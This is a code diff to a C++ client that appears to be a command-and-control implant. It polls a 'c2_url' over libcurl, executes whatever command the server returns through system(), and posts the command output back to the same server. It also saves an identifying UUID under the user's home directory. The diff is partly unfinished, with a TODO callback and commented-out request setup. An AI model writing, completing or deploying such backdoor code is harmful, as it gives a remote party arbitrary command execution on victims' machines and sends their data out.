@@ -41,6 +41,9 @@ size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
 }
 
 size_t read_callback(void* ptr, size_t size, size_t nmemb, void* userp) {
+    std::string& str = *reinterpret_cast<std::string*>(userp);
+
+
     //TODO: Complete
 }
 
@@ -74,13 +77,15 @@ void client_work() {
         exit(EXIT_FAILURE);
     }
 
-    curl_easy_reset(curl);
+    //curl_easy_reset(curl);
 
     //Issue GET request for uuid;
+    /*
     curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
     curl_easy_setopt(curl, CURLOPT_HTTPGET, true);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &raw_json);
+    */
 
     rapidjson::Document document;
     document.Parse(raw_json.c_str());
@@ -89,9 +94,16 @@ void client_work() {
     std::cout << "UUID: " << uuid << std::endl;
 
     //Write UUID to config file
-    FILE* fout = fopen("~/.config/c3.txt", "w+");
+
+    std::string config_file_path{};
+    if (getenv("HOME") != nullptr) {
+        config_file_path += getenv("HOME");
+        config_file_path += "/.config/c3.txt";
+    }
+
+    FILE* fout = fopen(config_file_path.c_str(), "w+");
     if (!fout) {
-        std::cerr << "Failed to open ~/.config/c3.txt" << std::endl;
+        std::cerr << "Failed to open file" << std::endl;
         std::cerr << strerror(errno) << std::endl;
         errno = 0;
         exit(EXIT_FAILURE);
@@ -104,11 +116,18 @@ void client_work() {
 
         std::string command;
 
-        curl_easy_reset(curl);
+        std::string header{"uuid:"};
+        header += uuid;
+
+        curl_slist* header_list = nullptr;
+        header_list = curl_slist_append(header_list, header.c_str());
+
+        //curl_easy_reset(curl);
         curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
         curl_easy_setopt(curl, CURLOPT_HTTPGET, true);
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        //curl_easy_setopt(curl, CURLOPT_HTTPHEADER, header_list);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &command);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
         curl_easy_perform(curl);
 
         //Pipe output of command to file
@@ -116,8 +135,6 @@ void client_work() {
 
         //Execute work
         system(command.c_str());
-
-        //TODO: Return output.txt
 
         //Read in data from file to temporary buffer
         std::vector<unsigned char> bytes;
@@ -133,6 +150,7 @@ void client_work() {
         curl_easy_reset(curl);
         curl_easy_setopt(curl, CURLOPT_URL, c2_url.c_str());
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, bytes.data());
+        curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
         curl_easy_perform(curl);
     }
 }
